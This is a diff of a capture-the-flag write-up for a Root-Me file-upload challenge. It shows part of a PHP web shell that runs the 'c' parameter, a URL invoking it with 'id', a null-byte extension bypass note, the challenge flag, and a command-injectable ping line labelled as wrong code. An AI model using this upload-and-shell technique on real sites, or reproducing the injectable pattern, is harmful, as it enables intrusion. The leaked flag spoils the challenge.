@@ -31,15 +31,13 @@ if(isset($_GET['c'])) {
 ?>
 ```
 
-
-Flag : YPNchi2NmTwygr2dgCCF
-
+Open the image in a new tab
 
 ![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260307234908.png)
 
 Then open in a new tab and find the password :
 
-Modified URL :
+Modified URL  (remove the %00.png because it already downloaded):
 
 http://challenge01.root-me.org/web-serveur/ch22/galerie/upload/2ec40fea5de474a2980db35cced66160/images.php?c=id
 
@@ -51,6 +49,7 @@ Flag : YPNchi2NmTwygr2dgCCF
 ## WRONG CODE : 
 
 >[!note]
+>
 > ```
 > $command = "ping -c 3 " . $target_ip;
 > ```
